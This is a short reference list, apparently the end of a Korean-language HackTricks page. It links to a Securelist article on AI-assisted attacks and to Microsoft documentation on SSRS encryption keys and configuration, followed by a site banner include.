- [13] [실제 환경에서의 CyberStrikeAI: 조직을 겨냥한 실제 공격에서 AI 활용](https://securelist.com/tr/cyberstrikeai-attacks/121715)
- [14] [Microsoft Learn - 암호화된 보고서 서버 데이터 저장](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn - RSReportServer.config 구성 파일](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
